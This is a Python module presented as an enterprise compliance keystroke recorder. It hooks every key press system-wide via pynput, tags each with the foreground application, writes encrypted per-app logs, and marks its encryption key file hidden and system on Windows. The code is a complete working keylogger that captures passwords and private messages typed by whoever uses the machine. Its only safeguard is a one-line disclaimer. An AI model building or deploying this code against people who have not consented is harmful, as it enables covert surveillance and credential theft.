"""
Keystroke Recorder Module

Securely records keystroke activity with encryption support.
Designed for enterprise compliance and monitoring requirements.

Features:
- Thread-safe keystroke logging
- Buffer with periodic flushing
- Per-application keystroke tracking
- AES encryption for sensitive data
- Configurable retention policies
- Export to JSON/CSV

IMPORTANT: This module handles sensitive data. Ensure proper legal/ethical compliance.
"""

import threading
import time
import logging
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Optional, Callable, List, Any
import json
from collections import defaultdict
import queue

# Import encryption
from cryptography.fernet import Fernet

logger = logging.getLogger(__name__)


class KeystrokeRecorder:
    """
    Records keystroke activity with encryption and buffering.
    
    Thread-safe implementation with:
    - Buffered writes for performance
    - Per-application tracking
    - Automatic flushing
    - Encryption support
    """
    
    def __init__(
        self,
        storage_dir: Path,
        callback: Optional[Callable[[Dict], None]] = None,
        enable_encryption: bool = True,
        buffer_flush_interval: int = 60,
        max_buffer_size: int = 1000,
        retention_days: int = 30
    ):
        """
        Initialize keystroke recorder.
        
        Args:
            storage_dir: Directory to store keystroke logs
            callback: Optional callback function for each keystroke event
            enable_encryption: Whether to encrypt stored data
            buffer_flush_interval: Seconds between buffer flushes
            max_buffer_size: Maximum keystrokes before forced flush
            retention_days: Days to retain logs
        """
        self.storage_dir = Path(storage_dir)
        self.callback = callback
        self.enable_encryption = enable_encryption
        self.buffer_flush_interval = buffer_flush_interval
        self.max_buffer_size = max_buffer_size
        self.retention_days = retention_days
        
        # Ensure storage directory exists
        self.storage_dir.mkdir(parents=True, exist_ok=True)
        
        # State management
        self.is_running = False
        self.listener = None
        self.buffer_thread: Optional[threading.Thread] = None
        
        # Keystroke buffer (thread-safe queue)
        self.keystroke_buffer = queue.Queue()
        
        # Current session tracking
        self.current_application = None
        self.session_start_time = None
        
        # Statistics
        self.total_keystrokes = 0
        self.sessions_count = 0
        
        # Encryption
        self.cipher = None
        if enable_encryption:
            self.cipher = self._init_encryption()
        
        logger.info(f"Keystroke recorder initialized (storage: {storage_dir})")
    
    def _init_encryption(self) -> Optional[Fernet]:
        """
        Initialize or load encryption key.
        
        Returns:
            Fernet cipher or None
        """
        key_file = self.storage_dir / '.keystroke_encryption_key'
        
        try:
            if key_file.exists():
                with open(key_file, 'rb') as f:
                    key = f.read()
                logger.info("Loaded existing keystroke encryption key")
            else:
                key = Fernet.generate_key()
                with open(key_file, 'wb') as f:
                    f.write(key)
                
                # Hide key file on Windows
                try:
                    import win32api
                    import win32con
                    win32api.SetFileAttributes(
                        str(key_file),
                        win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM
                    )
                except ImportError:
                    pass
                
                logger.info("Generated new keystroke encryption key")
            
            return Fernet(key)
            
        except Exception as e:
            logger.error(f"Error initializing keystroke encryption: {e}")
            return None
    
    def _get_active_application(self) -> str:
        """
        Get the name of the currently active application.
        
        Returns:
            Application name or "Unknown"
        """
        try:
            import win32gui
            import win32process
            import psutil
            
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            
            return process.name()
            
        except Exception as e:
            logger.debug(f"Could not get active application: {e}")
            return "Unknown"
    
    def _on_key_press(self, key):
        """
        Handle key press event.
        
        Args:
            key: Key event from pynput
        """
        try:
            # Get current application
            current_app = self._get_active_application()
            
            # Convert key to string
            try:
                key_str = key.char if hasattr(key, 'char') and key.char else str(key)
            except AttributeError:
                key_str = str(key)
            
            # Create keystroke event
            event = {
                'timestamp': datetime.now().isoformat(),
                'application': current_app,
                'key': key_str,
                'event_type': 'key_press'
            }
            
            # Add to buffer
            self.keystroke_buffer.put(event)
            self.total_keystrokes += 1
            
            # Call callback if provided
            if self.callback:
                try:
                    self.callback(event)
                except Exception as e:
                    logger.error(f"Error in keystroke callback: {e}")
            
            # Force flush if buffer is full
            if self.keystroke_buffer.qsize() >= self.max_buffer_size:
                self._flush_buffer()
                
        except Exception as e:
            logger.error(f"Error handling key press: {e}")
    
    def _buffer_flush_loop(self):
        """
        Periodic buffer flush loop.
        Runs in separate thread.
        """
        logger.info("Keystroke buffer flush thread started")
        
        while self.is_running:
            try:
                time.sleep(self.buffer_flush_interval)
                
                if not self.keystroke_buffer.empty():
                    self._flush_buffer()
                    
            except Exception as e:
                logger.error(f"Error in buffer flush loop: {e}")
        
        # Final flush on stop
        if not self.keystroke_buffer.empty():
            self._flush_buffer()
        
        logger.info("Keystroke buffer flush thread stopped")
    
    def _flush_buffer(self):
        """
        Flush keystroke buffer to disk.
        """
        if self.keystroke_buffer.empty():
            return
        
        try:
            # Collect all buffered keystrokes
            keystrokes = []
            while not self.keystroke_buffer.empty():
                try:
                    keystrokes.append(self.keystroke_buffer.get_nowait())
                except queue.Empty:
                    break
            
            if not keystrokes:
                return
            
            # Group by application and date
            grouped_data = defaultdict(list)
            for ks in keystrokes:
                app = ks.get('application', 'Unknown')
                date = datetime.fromisoformat(ks['timestamp']).date()
                key = f"{date}_{app}"
                grouped_data[key].append(ks)
            
            # Save each group to file
            for key, data in grouped_data.items():
                date, app = key.split('_', 1)
                filename = f"{date}_{app.replace('.', '_')}.json"
                filepath = self.storage_dir / filename
                
                # Load existing data if file exists
                existing_data = []
                if filepath.exists():
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            content = f.read()
                            if self.cipher and content:
                                content = self.cipher.decrypt(content.encode()).decode()
                            if content:
                                existing_data = json.loads(content)
                    except Exception as e:
                        logger.warning(f"Could not load existing file {filepath}: {e}")
                
                # Merge and save
                existing_data.extend(data)
                
                # Convert to JSON
                json_data = json.dumps(existing_data, indent=2)
                
                # Encrypt if enabled
                if self.cipher:
                    json_data = self.cipher.encrypt(json_data.encode()).decode()
                
                # Write to file
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(json_data)
            
            logger.debug(f"Flushed {len(keystrokes)} keystrokes to disk")
            
            # Clean old files
            self._cleanup_old_files()
            
        except Exception as e:
            logger.error(f"Error flushing keystroke buffer: {e}")
    
    def _cleanup_old_files(self):
        """
        Delete keystroke logs older than retention period.
        """
        try:
            cutoff_date = datetime.now().date() - timedelta(days=self.retention_days)
            
            for filepath in self.storage_dir.glob('*.json'):
                try:
                    # Extract date from filename (format: YYYY-MM-DD_AppName.json)
                    date_str = filepath.stem.split('_')[0]
                    file_date = datetime.strptime(date_str, '%Y-%m-%d').date()
                    
                    if file_date < cutoff_date:
                        filepath.unlink()
                        logger.info(f"Deleted old keystroke log: {filepath.name}")
                        
                except Exception as e:
                    logger.debug(f"Could not parse date from {filepath.name}: {e}")
                    
        except Exception as e:
            logger.error(f"Error cleaning up old keystroke files: {e}")
    
    def start(self):
        """
        Start keystroke recording.
        """
        if self.is_running:
            logger.warning("Keystroke recorder already running")
            return
        
        try:
            from pynput import keyboard
            
            self.is_running = True
            
            # Start keyboard listener
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            
            # Start buffer flush thread
            self.buffer_thread = threading.Thread(
                target=self._buffer_flush_loop,
                daemon=True,
                name="KeystrokeBufferFlushThread"
            )
            self.buffer_thread.start()
            
            logger.info("Keystroke recorder started")
            
        except ImportError as e:
            logger.error(f"pynput library not available: {e}")
            self.is_running = False
        except Exception as e:
            logger.error(f"Error starting keystroke recorder: {e}")
            self.is_running = False
    
    def stop(self):
        """
        Stop keystroke recording.
        """
        if not self.is_running:
            return
        
        logger.info("Stopping keystroke recorder...")
        self.is_running = False
        
        # Stop listener
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        # Wait for buffer thread
        if self.buffer_thread:
            self.buffer_thread.join(timeout=5)
        
        logger.info("Keystroke recorder stopped")
    
    def is_monitoring(self) -> bool:
        """
        Check if currently monitoring keystrokes.
        
        Returns:
            True if monitoring, False otherwise
        """
        return self.is_running and (self.listener is not None)
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get recording statistics.
        
        Returns:
            Statistics dictionary
        """
        return {
            'is_running': self.is_running,
            'total_keystrokes': self.total_keystrokes,
            'buffer_size': self.keystroke_buffer.qsize(),
            'storage_dir': str(self.storage_dir),
            'encryption_enabled': self.enable_encryption,
        }
    
    def export_to_json(
        self,
        output_file: Path,
        start_date: Optional[datetime] = None,
        end_date: Optional[datetime] = None,
        decrypt: bool = False
    ) -> bool:
        """
        Export keystroke logs to JSON file.
        
        Args:
            output_file: Output file path
            start_date: Optional start date filter
            end_date: Optional end date filter
            decrypt: Whether to decrypt before exporting
            
        Returns:
            True if successful
        """
        try:
            all_data = []
            
            for filepath in sorted(self.storage_dir.glob('*.json')):
                try:
                    # Check date range if specified
                    if start_date or end_date:
                        date_str = filepath.stem.split('_')[0]
                        file_date = datetime.strptime(date_str, '%Y-%m-%d')
                        
                        if start_date and file_date < start_date:
                            continue
                        if end_date and file_date > end_date:
                            continue
                    
                    # Read and decrypt if needed
                    with open(filepath, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                        if self.cipher and content and decrypt:
                            content = self.cipher.decrypt(content.encode()).decode()
                        
                        if content:
                            data = json.loads(content)
                            all_data.extend(data)
                            
                except Exception as e:
                    logger.warning(f"Error reading {filepath.name}: {e}")
            
            # Write combined data
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(all_data, f, indent=2)
            
            logger.info(f"Exported {len(all_data)} keystroke events to {output_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error exporting keystroke logs: {e}")
            return False


# Test/Debug mode
if __name__ == "__main__":
    import tempfile
    
    # Setup logging
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Create temporary storage
    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"Testing keystroke recorder in: {tmpdir}\n")
        
        def test_callback(event):
            print(f"Key pressed: {event['key']} in {event['application']}")
        
        # Create recorder
        recorder = KeystrokeRecorder(
            storage_dir=Path(tmpdir),
            callback=test_callback,
            enable_encryption=True,
            buffer_flush_interval=5
        )
        
        # Start recording
        recorder.start()
        
        print("Keystroke recorder running for 15 seconds...")
        print("Type something to test!\n")
        
        try:
            for i in range(15):
                time.sleep(1)
                stats = recorder.get_statistics()
                print(f"Stats: {stats['total_keystrokes']} keystrokes, buffer: {stats['buffer_size']}")
        except KeyboardInterrupt:
            pass
        
        # Stop recording
        recorder.stop()
        
        print("\nRecording stopped")
        print(f"Total keystrokes: {recorder.total_keystrokes}")
        print(f"Files created: {list(Path(tmpdir).glob('*.json'))}")
